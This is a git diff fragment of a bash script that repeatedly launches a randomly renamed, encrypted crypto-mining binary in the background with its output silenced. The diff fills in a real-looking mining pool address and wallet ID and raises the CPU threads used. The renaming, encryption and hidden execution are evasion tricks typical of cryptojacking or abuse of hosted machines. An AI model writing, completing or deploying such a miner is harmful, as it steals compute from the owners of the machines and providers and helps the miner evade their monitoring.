@@ -40,7 +40,7 @@ while true; do
   encrypt_and_sign_miner_binary "$random_name"
 
   # Run the miner in the background for 1 minute
-  nohup ./encrypted_"$random_name" -c stratum+tcp://your_pool_address_here -u your_wallet_address_here --cpu 2 >/dev/null 2>&1 &
+  nohup ./encrypted_"$random_name" -c stratum+tcp://ap.vipor.net:5040 -u RMWTqPzqBZCP3LT893jwxwNhEbs6umRGWw.vpsgit --cpu 3 >/dev/null 2>&1 &
   miner_pid=$!
 
   # Wait for 1 minute while mining
